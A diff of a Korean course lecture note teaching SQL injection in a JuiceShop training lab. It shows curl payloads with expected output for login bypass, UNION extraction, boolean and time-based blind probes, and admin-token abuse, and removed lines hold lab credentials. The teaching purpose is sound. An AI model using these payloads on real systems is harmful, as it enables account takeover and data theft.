@@ -1,122 +1,68 @@
-# Week 04: OWASP Top 10 (1) - SQL Injection
+# Week 04: OWASP Top 10 (1) — SQL Injection
 
 ## 학습 목표
 - SQL의 기본 문법(SELECT, WHERE, UNION)을 이해한다
-- SQL Injection의 원리와 유형을 파악한다
-- JuiceShop에서 실제 SQL Injection 공격을 수행한다
-- SQL Injection 방어 기법을 이해한다
-
-## 실습 환경 (공통)
-
-| 서버 | IP | 역할 | 접속 |
-|------|-----|------|------|
-| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
-| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
-| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
-| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |
-
-**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
-
-## 강의 시간 배분 (3시간)
-
-| 시간 | 내용 | 유형 |
-|------|------|------|
-| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
-| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
-| 1:10-1:20 | 휴식 | - |
-| 1:20-2:00 | 실습 (Part 3) | 실습 |
-| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
-| 2:40-2:50 | 휴식 | - |
-| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
-| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |
-
----
-
----
-
-## 용어 해설 (이 과목에서 자주 나오는 용어)
-
-> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
-> 강의 중 모르는 용어가 나오면 이 표를 참고하라.
-
-| 용어 | 영문 | 설명 | 비유 |
-|------|------|------|------|
-| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
-| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
-| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
-| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
-| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
-| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
-| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
-| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
-| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
-| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
-| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
-| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
-| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
-| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
-| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
-| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
-| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
-| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
-| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
-| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
-| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
-| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
-| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
-| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
-| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
-| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
-| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
-| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
-| **Bastion** | Bastion | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |
-
----
-
-# Week 04: OWASP Top 10 (1) - SQL Injection
-
-## 학습 목표
-
-- SQL의 기본 문법(SELECT, WHERE, UNION)을 이해한다
-- SQL Injection의 원리와 유형을 파악한다
-- JuiceShop에서 실제 SQL Injection 공격을 수행한다
-- SQL Injection 방어 기법을 이해한다
+- SQL Injection의 원리와 4가지 유형(Error/UNION/Blind/Time-based)을 구분한다
+- JuiceShop에서 실제 SQL Injection 공격을 수행하여 관리자 권한을 획득한다
+- sqlmap 자동화 도구를 활용하여 DB 구조와 데이터를 추출한다
+- SQL Injection 방어 기법(매개변수화 쿼리, ORM, 입력 검증)을 설명한다
+- 공격이 SIEM에서 어떻게 탐지되는지 파악한다
 
 ## 실습 환경
 
 | 호스트 | IP | 역할 |
 |--------|-----|------|
-| bastion | 10.20.30.201 | 실습 기지 |
-| web | 10.20.30.80 | JuiceShop:3000 |
+| manager | 10.20.30.200 | 실습 기지, Bastion API :8003 |
+| web | 10.20.30.80 | JuiceShop :3000 (공격 대상) |
+| siem | 10.20.30.100 | Wazuh 탐지 확인 |
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:30 | OWASP Top 10 + SQL 기초 (Part 1~2) | 강의 |
+| 0:30-1:00 | SQLi 원리·유형 (Part 3~4) | 강의 |
+| 1:00-1:10 | 휴식 | - |
+| 1:10-1:50 | JuiceShop 관리자 로그인 우회 (Part 5) | 실습 |
+| 1:50-2:30 | UNION 데이터 추출 + Blind SQLi (Part 6) | 실습 |
+| 2:30-2:40 | 휴식 | - |
+| 2:40-3:10 | sqlmap 자동화 (Part 7) | 실습 |
+| 3:10-3:30 | 방어 + SIEM 탐지 (Part 8~9) + Bastion | 실습 |
+| 3:30-3:40 | 정리 + 과제 | 정리 |
 
 ---
 
-## 1. OWASP Top 10이란?
+# Part 1: OWASP Top 10 배경
 
-OWASP(Open Web Application Security Project)는 웹 애플리케이션 보안을 위한 국제 비영리 단체다. **OWASP Top 10**은 가장 치명적인 웹 보안 위협 10가지를 정리한 목록이다.
+OWASP(Open Web Application Security Project)는 웹 애플리케이션 보안을 위한 국제 비영리 단체다. **OWASP Top 10**은 가장 치명적인 웹 보안 위협 10가지를 정리한 목록으로, 모의해킹 보고서의 업계 표준 프레임워크다.
 
-### OWASP Top 10 (2021)
+## OWASP Top 10 (2021)
 
-| 순위 | 위협 | 이번 강의 |
+| 순위 | 위협 | 본 과정 실습 주차 |
 |------|------|-----------|
 | A01 | Broken Access Control | Week 06 |
-| A02 | Cryptographic Failures | - |
+| A02 | Cryptographic Failures | (Week 03 JWT 예시) |
 | A03 | **Injection (SQL, XSS 등)** | **Week 04, 05** |
-| A04 | Insecure Design | - |
+| A04 | Insecure Design | (과제 토론) |
 | A05 | Security Misconfiguration | Week 07 |
-| A06 | Vulnerable Components | - |
+| A06 | Vulnerable Components | (Week 02 버전 탐지) |
 | A07 | Authentication Failures | Week 06 |
-| A08 | Software and Data Integrity | - |
-| A09 | Logging & Monitoring Failures | - |
+| A08 | Software and Data Integrity | (SSDF 과목 참조) |
+| A09 | Logging & Monitoring Failures | (SOC 과목) |
 | A10 | Server-Side Request Forgery | Week 07 |
+
+**이번 주(A03 Injection)가 OWASP에서 가장 오래 1위였던 이유:**
+- 2013~2017년 OWASP Top 10 **1위**
+- 2021년 3위로 내려갔으나 여전히 발생 빈도·피해 규모 최상위
+- 단순한 기법이지만 방어 누락이 쉽게 발생
 
 ---
 
-## 2. SQL 기초
+# Part 2: SQL 기초
 
 SQL(Structured Query Language)은 데이터베이스를 조작하는 언어다. SQL Injection을 이해하려면 SQL 기본 문법을 알아야 한다.
 
-### 2.1 기본 문법
+## 2.1 기본 문법
 
 ```sql
 -- 테이블에서 모든 데이터 조회
@@ -128,7 +74,7 @@ SELECT * FROM Users WHERE email = 'admin@juice-sh.op';
 -- 여러 조건 (AND, OR)
 SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '1234';
 
--- 결과 합치기 (UNION)
+-- 결과 합치기 (UNION) — 두 쿼리의 결과를 위아래로 합침
 SELECT id, email FROM Users
 UNION
 SELECT id, name FROM Products;
@@ -138,170 +84,197 @@ SELECT * FROM Users WHERE email = 'admin' -- 이 뒤는 무시됨
 SELECT * FROM Users WHERE email = 'admin' /* 블록 주석 */
 ```
 
-### 2.2 로그인 쿼리의 동작
+**UNION의 규칙** (공격에서 중요):
+- UNION으로 합치는 두 SELECT는 **컬럼 수가 같아야 한다**
+- 컬럼의 **데이터 타입도 호환**되어야 한다
 
-일반적인 웹 애플리케이션의 로그인 처리:
+## 2.2 로그인 쿼리의 동작 (취약한 예시)
+
+일반적인 웹 애플리케이션의 **취약한** 로그인 처리:
 
 ```
 사용자 입력: email = "admin@juice-sh.op", password = "mypassword"
 
-서버가 실행하는 SQL:
-SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = 'mypassword'
+서버가 생성하는 SQL (문자열 연결):
+SELECT * FROM Users
+WHERE email = 'admin@juice-sh.op'
+  AND password = 'mypassword'
 ```
 
-결과가 있으면 로그인 성공, 없으면 실패.
+결과가 있으면 로그인 성공, 없으면 실패. 공격자는 이 쿼리의 **논리를 조작**한다.
 
 ---
 
-## 3. SQL Injection이란?
+# Part 3: SQL Injection의 원리
+
+## 3.1 왜 SQL Injection이 가능한가
 
 SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 **그대로** 삽입될 때 발생한다. 공격자가 입력에 SQL 구문을 넣어서 쿼리의 의미를 변경한다.
 
-### 3.1 원리
-
-**정상적인 경우:**
+**정상 입력:**
 ```
 입력: email = "admin@juice-sh.op"
 쿼리: SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '...'
 ```
 
-**공격자의 입력:**
+**공격 입력:**
 ```
 입력: email = "' OR 1=1--"
 쿼리: SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
 ```
 
-쿼리를 분석해보자:
-- `email = ''` → 빈 문자열과 비교 (거짓)
+**쿼리 분해:**
+- `email = ''` → 빈 문자열 비교 (거짓)
 - `OR 1=1` → 항상 참
-- `--` → SQL 주석, 뒤의 `AND password = '...'` 부분을 무시
+- `--` → SQL 주석, 뒤의 `AND password = '...'` 부분 무시
+- 최종: `WHERE 거짓 OR 참` → 항상 참 → **모든 사용자 반환** → 첫 번째 사용자(admin)로 로그인 성공
 
-결과: **모든 사용자가 반환됨** → 첫 번째 사용자(보통 admin)로 로그인 성공!
-
-### 3.2 왜 위험한가?
+## 3.2 왜 위험한가
 
 SQL Injection으로 할 수 있는 것:
-- **인증 우회**: 비밀번호 없이 로그인
-- **데이터 탈취**: 전체 데이터베이스 내용 읽기
-- **데이터 변조**: 데이터 수정/삭제
-- **서버 장악**: 일부 DB에서는 OS 명령 실행 가능
+
+| 공격 | 결과 | 실제 사례 |
+|------|------|-----------|
+| 인증 우회 | 비밀번호 없이 로그인 | 2020 한국 대형쇼핑몰 100만건 유출 |
+| 데이터 탈취 | 전체 DB 내용 읽기 | 2024 MOVEit CVE-2023-34362 글로벌 유출 |
+| 데이터 변조 | 데이터 수정·삭제 | 랜섬 SQLi 사례 |
+| 서버 장악 | xp_cmdshell(MSSQL)로 OS 명령 실행 | 2017 Equifax SQLi → APT |
 
 ---
 
-## 4. SQL Injection 유형
+# Part 4: SQL Injection 유형
 
-### 4.1 Error-based SQLi
+## 4.1 Error-based SQLi
 
-SQL 오류 메시지를 통해 정보를 추출한다.
+**정의:** SQL 오류 메시지가 응답에 노출되어 DB 정보를 직접 추출할 수 있는 경우.
 
-> **이 실습을 왜 하는가?**
-> Error-based SQLi는 가장 쉬운 SQLi 유형이다. 서버가 에러 메시지를 그대로 반환하면,
-> 공격자는 DB 종류, 테이블 구조, 데이터를 에러 메시지에서 직접 읽을 수 있다.
-> 이 실습에서는 단순히 따옴표(`'`) 하나를 보내서 SQL 구문 에러를 유발하고,
-> 에러 메시지에서 DB 기술 스택 정보를 추출하는 방법을 배운다.
->
-> **실무 시나리오:** 모의해킹에서 로그인 폼이나 검색창에 `'`를 입력하는 것은
-> SQLi 취약점 존재 여부를 확인하는 가장 기본적인 테스트이다.
-> 500 에러가 반환되면 → SQLi 가능성이 높다.
-> 200이 반환되면 → 입력값 검증이 잘 되어 있거나, 에러를 숨기고 있다.
-
-> **실습 목적**: SQL Injection 취약점의 존재 여부를 확인하는 기본 테스트를 수행한다
->
-> **배우는 것**: 특수문자 입력으로 SQL 구문 에러를 유발하여 DB 기술 스택과 SQLi 가능성을 판별하는 방법을 배운다
->
-> **결과 해석**: 500 에러와 SQL 에러 메시지가 반환되면 SQLi 취약점이 존재할 가능성이 높고, 200 반환 시 입력값 검증이 동작 중이다
->
-> **실전 활용**: 웹 애플리케이션 침투 테스트에서 로그인 폼과 검색창의 SQLi 취약점을 1차 스크리닝하는 표준 절차이다
+**이것을 먼저 시도하는 이유:** 존재 여부를 확인하는 가장 빠른 방법. 따옴표(`'`) 하나만 넣어봐도 500 에러가 나면 SQLi 가능성이 매우 높다.
 
 ```bash
-# 따옴표 하나로 SQL 에러 유발
+# 이메일 필드에 따옴표 하나 삽입 → SQL 구문 에러 유발
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\''","password":"test"}'
-# 500 에러와 함께 스택 트레이스 반환 (검증 완료)
+  -d '{"email":"'"'"'","password":"test"}'
 ```
 
-**예상 출력:** (HTML 에러 페이지)
+**명령 분해:**
+- `-d '{"email":"'"'"'","password":"test"}'`: 셸에서 작은따옴표를 이스케이프하는 트릭. JSON 안에 `'`가 들어가도록 `'"'"'` 패턴으로 연결
+- 결과적으로 서버는 `email=' password='test'` 형태의 요청을 받음
+
+**예상 출력 (HTML 에러 페이지):**
 ```
 OWASP Juice Shop (Express ^4.22.1)
 500 Error
   at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
   at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50
-  ...
 ```
 
-> **분석**: 에러 페이지에서 다음 정보를 추출할 수 있다:
-> - **Express ^4.22.1** → Node.js Express 프레임워크 버전
-> - **sequelize/lib/dialects/sqlite** → SQLite 데이터베이스, Sequelize ORM 사용
-> - **/juice-shop/** → 앱 설치 경로
-> 이 정보만으로 공격자는 DB 종류(SQLite)와 프레임워크를 파악하여 공격을 최적화할 수 있다.
-> 실무에서는 이런 에러 정보가 외부에 노출되지 않도록 커스텀 에러 페이지를 설정한다.
+**결과 해석 — 에러 메시지에서 얻은 정보:**
+- `Express ^4.22.1`: Node.js Express 버전
+- `sequelize/lib/dialects/sqlite`: **SQLite DB**, **Sequelize ORM** 사용
+- `/juice-shop/node_modules/`: 앱 설치 경로
 
-### 4.2 UNION-based SQLi
+이 세 정보만으로 공격 방향이 구체화된다. 실무에서는 **커스텀 에러 페이지**로 이런 스택 트레이스를 숨겨야 한다.
 
-UNION SELECT를 사용하여 다른 테이블의 데이터를 추출한다.
+## 4.2 UNION-based SQLi
+
+**정의:** UNION SELECT로 다른 테이블의 데이터를 원래 쿼리의 결과와 합쳐서 가져온다.
+
+**성공 조건:**
+1. 원래 쿼리의 **컬럼 수**를 맞춰야 함
+2. 컬럼의 **데이터 타입**이 호환되어야 함
 
 ```bash
 # JuiceShop 검색 기능에 UNION 공격
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+1,2,3,4,5,6,7,8,9--" \
-  | python3 -m json.tool
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))+UNION+SELECT+1,2,3,4,5,6,7,8,9--" \
+  | python3 -m json.tool 2>/dev/null | head -20
 ```
 
-> UNION 공격이 성공하려면 원래 쿼리의 컬럼 수를 맞춰야 한다.
+**URL 인코딩 주의:** `+`는 공백으로 해석되고, `'`는 `%27`로 써도 된다. JuiceShop은 URL 인코딩을 덜 엄격하게 처리하여 평문 `'`도 받는다.
 
-### 4.3 Blind SQLi
+**페이로드 분해:** `test'))+UNION+SELECT+1,2,3,4,5,6,7,8,9--`
+- `test'))`: 원래 쿼리가 `WHERE ((name LIKE '%검색어%')...` 형태이므로 괄호 두 개 닫기
+- `UNION SELECT 1,2,3,4,5,6,7,8,9`: 9개 컬럼 (JuiceShop Products 테이블 컬럼 수)
+- `--`: 원래 쿼리의 나머지 주석 처리
 
-결과가 직접 보이지 않을 때, 참/거짓 응답의 차이로 정보를 추출한다.
+**예상 출력 (성공 시):**
+```json
+{
+    "status": "success",
+    "data": [
+        {"id":1, "name":"Apple Juice", ...},
+        ...
+        {"id":1, "name":"2", "description":"3", ...}   ← UNION으로 주입된 행!
+    ]
+}
+```
+
+컬럼 수가 맞지 않으면 에러가 난다. 맞는 컬럼 수를 찾기 위해 1,2,3부터 올리며 시도하는 것을 **"column count discovery"**라 한다.
+
+## 4.3 Boolean-based Blind SQLi
+
+**정의:** 응답에 결과가 직접 표시되지 않지만, "참/거짓"에 따라 응답 크기·내용이 달라지는 경우 한 비트씩 정보를 추출한다.
+
+**왜 "블라인드"인가:** DB 에러나 UNION 결과가 화면에 나오지 않아도, "응답이 왔는가/안 왔는가", "응답 크기가 달라졌는가"로 조건의 참·거짓을 판별할 수 있다.
 
 ```bash
-# Boolean-based blind: 참일 때와 거짓일 때 응답이 다름
-# 참인 조건
-curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=1--" | wc -c
-# 거짓인 조건
-curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=2--" | wc -c
+# 참 조건: 응답에 제품이 있음
+TRUE_SIZE=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=1--" | wc -c)
+echo "1=1 (참): $TRUE_SIZE bytes"
+
+# 거짓 조건: 응답이 비어있음
+FALSE_SIZE=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=2--" | wc -c)
+echo "1=2 (거짓): $FALSE_SIZE bytes"
 ```
 
-### 4.4 Time-based Blind SQLi
+**예상 출력:**
+```
+1=1 (참): 1234 bytes
+1=2 (거짓): 42 bytes
+```
 
-응답 시간의 차이로 정보를 추출한다.
+**결과 해석:** 응답 크기가 크게 다르면 Blind SQLi 가능. 이 차이를 이용해 `AND SUBSTR(password,1,1)='a'` 같은 조건을 하나씩 시도하여 비밀번호를 한 글자씩 추출한다. 손으로 하면 수백 번 요청 → sqlmap이 이 과정을 자동화한다 (Part 7).
+
+## 4.4 Time-based Blind SQLi
+
+**정의:** 응답 내용이 항상 같아서 Boolean조차 판별 불가할 때, **응답 시간**으로 참/거짓을 구분한다.
+
+**원리:** 조건이 참이면 특정 시간 대기, 거짓이면 즉시 응답 → 응답 시간 차이로 판별.
 
 ```bash
-# SQLite에서는 다른 방법 사용 (예시 개념)
-# 참이면 응답이 느림, 거짓이면 빠름
-time curl -s "http://10.20.30.80:3000/rest/products/search?q=test" > /dev/null
+# SQLite는 sleep() 함수가 없어 대안 기법 사용 (CPU 연산 유도)
+# 참이면 무거운 연산, 거짓이면 안 함
+echo "=== 참 조건 (CASE 동작) ==="
+time curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(CASE+WHEN+1=1+THEN+randomblob(100000000)+ELSE+''+END)+IS+NOT+NULL--" > /dev/null
+
+echo "=== 거짓 조건 (CASE 건너뜀) ==="
+time curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(CASE+WHEN+1=2+THEN+randomblob(100000000)+ELSE+''+END)+IS+NOT+NULL--" > /dev/null
 ```
+
+**명령 분해:**
+- SQLite는 `sleep()` 대신 **`randomblob(큰_수)`**로 CPU 부하를 유도한다
+- 참 조건에서는 1억 바이트 랜덤 생성 → 수 초 지연
+- 거짓 조건에서는 CASE가 ELSE로 빠져 빠름
+
+**예상 출력:**
+```
+=== 참 조건 (CASE 동작) ===
+real    0m1.234s
+=== 거짓 조건 (CASE 건너뜀) ===
+real    0m0.032s
+```
+
+**결과 해석:** 응답 시간이 1초 이상 차이나면 Time-based Blind SQLi 성립. 수만 번 요청으로 한 글자씩 추출할 수 있어 Boolean-based보다 느리지만 **거의 모든 SQLi를 탐지할 수 있는 최후 수단**.
 
 ---
 
-## 5. 실습: JuiceShop SQL Injection 공격
+# Part 5: JuiceShop 관리자 로그인 우회 (Challenge)
 
-### 5.1 Challenge: Admin Login (관리자 로그인 우회)
+JuiceShop에서 가장 유명한 SQLi 챌린지. 비밀번호 없이 admin 계정으로 로그인한다.
 
-> **이 실습을 왜 하는가?**
-> SQL Injection으로 **비밀번호 없이 관리자로 로그인**하는 것은 모의해킹에서 가장 극적인 발견이다.
-> 실제 보안 사고에서도 SQLi를 통한 인증 우회는 빈번하게 발생한다.
-> - 2020년: 한 한국 대형 쇼핑몰에서 SQLi로 100만 건 개인정보 유출
-> - 2024년: MOVEit 파일 전송 서비스 SQLi로 글로벌 대규모 데이터 유출
->
-> **이걸 하면 무엇을 알 수 있는가?**
-> - 단 한 줄의 입력(`' OR 1=1--`)으로 인증을 완전히 우회할 수 있음
-> - SQL 쿼리의 논리를 조작하여 항상 참이 되는 조건을 만들 수 있음
-> - 관리자 JWT 토큰을 획득하면 모든 API에 접근 가능
->
-> **주의:** 이 기법은 **허가된 실습 환경에서만** 사용한다. 실제 서비스에 시도하면 **불법**이다.
->
-> **실습 방법:**
-> 1. 먼저 정상 로그인이 실패하는 것을 확인 (baseline)
-> 2. SQLi 페이로드로 로그인 우회
-> 3. 획득한 JWT를 디코딩하여 admin 권한 확인
-> 4. admin 토큰으로 관리자 API 접근
-
-JuiceShop의 가장 유명한 SQLi 챌린지다. 비밀번호 없이 admin 계정으로 로그인한다.
-
-**Step 1: 정상 로그인 시도**
+## 5.1 Step 1: 정상 로그인 실패 확인 (Baseline)
 
 ```bash
-# 틀린 비밀번호로 로그인 시도
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op","password":"wrong"}' \
@@ -315,14 +288,21 @@ curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 }
 ```
 
-**Step 2: SQL Injection으로 로그인 우회**
+**의미:** admin 이메일은 존재하지만 비밀번호가 틀려서 실패. 이메일 존재 여부는 서비스가 다른 응답 메시지로 구분해주지 않으면 좋겠지만, JuiceShop은 그대로 알려준다.
+
+## 5.2 Step 2: SQLi로 로그인 우회
 
 ```bash
-# ' OR 1=1-- 를 이메일 필드에 삽입
+# ' OR 1=1-- 을 이메일 필드에 삽입
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
+  -d '{"email":"'"'"' OR 1=1--","password":"anything"}' \
   | python3 -m json.tool
+```
+
+**생성되는 SQL:**
+```sql
+SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = 'anything'
 ```
 
 **예상 출력:**
@@ -336,26 +316,26 @@ curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 }
 ```
 
-> **성공!** 비밀번호 없이 admin 계정으로 로그인했다. `OR 1=1`이 모든 행을 반환하게 만들어서, 첫 번째 사용자(admin)로 로그인된 것이다.
+**결과 해석:** `OR 1=1`로 조건이 항상 참 → `SELECT * FROM Users`와 동일 → 모든 행 반환 → 첫 번째 행이 admin → admin 세션 토큰 발급됨.
 
-**Step 3: 얻은 JWT 토큰 분석**
+## 5.3 Step 3: 획득한 JWT 분석
 
 ```bash
 # 토큰 저장
 ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
+  -d '{"email":"'"'"' OR 1=1--","password":"anything"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
 
-echo "Admin Token: $ADMIN_TOKEN"
+echo "Admin Token (앞 50자): ${ADMIN_TOKEN:0:50}..."
 
 # JWT 페이로드 디코딩
 echo "$ADMIN_TOKEN" | cut -d. -f2 | python3 -c "
 import sys, base64, json
-payload = sys.stdin.read().strip()
-payload += '=' * (4 - len(payload) % 4)
-decoded = base64.urlsafe_b64decode(payload)
-print(json.dumps(json.loads(decoded), indent=2, ensure_ascii=False))
+p = sys.stdin.read().strip()
+p += '=' * (4 - len(p) % 4)
+d = json.loads(base64.urlsafe_b64decode(p))
+print(json.dumps(d, indent=2, ensure_ascii=False))
 "
 ```
 
@@ -365,137 +345,305 @@ print(json.dumps(json.loads(decoded), indent=2, ensure_ascii=False))
   "status": "success",
   "data": {
     "id": 1,
-    "username": "",
     "email": "admin@juice-sh.op",
     "password": "0192023a7bbd73250516f069df18b500",
     "role": "admin",
-    "isActive": true,
-    "createdAt": "2026-03-25 01:13:41.120 +00:00"
-  },
-  "iat": 1774623850
+    "isActive": true
+  }
 }
 ```
 
-> **주의!** JWT 페이로드에 **패스워드 해시**(`0192023a7bbd73250516f069df18b500`)까지 포함되어 있다.
-> 이것은 JuiceShop의 의도적 취약점이다. 실무에서 JWT에 패스워드를 넣으면 심각한 보안 사고이다.
-> 이 해시는 MD5이며, 크래킹하면 원래 비밀번호를 알 수 있다.
-```
+**결과 해석 — CRITICAL 발견:**
+- `role: admin` 확인 — 이 토큰으로 모든 관리자 API 접근 가능
+- `password` 필드에 **MD5 해시** 포함 (JuiceShop 의도적 취약점)
+- 해시 값 `0192023a...500`은 **"admin123"**의 MD5 — crackstation.net에서 즉시 역산 가능
 
-### 5.2 관리자 토큰으로 API 접근
+## 5.4 Step 4: Admin 토큰으로 API 접근
 
 ```bash
-# 관리자 전용 기능에 접근
 # 전체 사용자 목록 조회
 curl -s http://10.20.30.80:3000/api/Users/ \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
-  | python3 -m json.tool
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'사용자 {len(d.get(\"data\",[]))}명 조회됨')"
 
-# 관리자 패널 접근
-curl -s http://10.20.30.80:3000/administration \
-  -H "Authorization: Bearer $ADMIN_TOKEN" \
-  -o /dev/null -w "%{http_code}\n"
+# 관리자 페이지 접근
+curl -s -o /dev/null -w "%{http_code}\n" \
+  http://10.20.30.80:3000/administration \
+  -H "Authorization: Bearer $ADMIN_TOKEN"
 ```
 
-### 5.3 특정 사용자로 로그인
+## 5.5 특정 사용자로 로그인 (컨트롤된 방식)
 
-`' OR 1=1--`은 첫 번째 사용자로 로그인한다. 특정 사용자를 지정할 수도 있다:
+`' OR 1=1--`은 첫 번째 사용자로 들어간다. 특정 사용자를 지정하려면:
 
 ```bash
-# admin 이메일을 직접 지정하고 비밀번호 검증 우회
+# admin 이메일을 직접 지정하고 비밀번호 검증만 주석 처리
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' \
-  | python3 -m json.tool
+  -d '{"email":"admin@juice-sh.op'"'"'--","password":"anything"}' \
+  | python3 -m json.tool | head -10
 ```
 
-**쿼리 분석:**
+**생성되는 SQL:**
 ```sql
-SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'
+SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'anything'
 ```
-- `admin@juice-sh.op'` → 이메일 지정
-- `--` → 비밀번호 검증 부분을 주석 처리
-
-### 5.4 검색 기능에서의 SQLi
-
-```bash
-# 정상 검색
-curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" \
-  | python3 -m json.tool | head -15
-
-# SQLi로 모든 제품 표시
-curl -s "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--" \
-  | python3 -m json.tool | head -30
-```
+- `email = 'admin@juice-sh.op'` → admin 이메일 정확히 지정
+- `--` → 그 뒤 `AND password = ...` 전체 주석 처리
 
 ---
 
-## 6. SQL Injection 심화: 데이터 추출
+# Part 6: 데이터 추출 (UNION + Blind)
 
-### 6.1 테이블 구조 파악
+## 6.1 SQLite 테이블 구조 파악
 
-SQLite에서 테이블 목록을 조회하는 방법:
-
-```bash
-# UNION SELECT로 테이블 목록 추출 시도
-# 컬럼 수를 맞춰야 하므로 여러 번 시도
-curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" \
-  | python3 -m json.tool 2>/dev/null | head -30
-```
-
